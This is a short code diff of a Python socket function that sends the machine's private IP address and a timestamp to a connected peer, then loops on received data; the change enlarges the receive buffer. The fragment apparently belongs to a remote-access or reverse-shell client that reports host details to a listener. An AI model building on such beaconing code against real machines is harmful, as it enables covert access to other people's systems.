@@ -30,7 +30,7 @@ def socket_():
 			_socket_.sendall(f"       - Private IP: {socket.gethostbyname(socket.gethostname())}\n".encode())
 			_socket_.sendall(f"[*] Time: {time.strftime('%A %d/%m/%Y %H:%M:%S')}\n\n".encode())
 			while True:
-				response = _socket_.recv(1)
+				response = _socket_.recv(1024)
 	except Exception as e:
 		return False
 
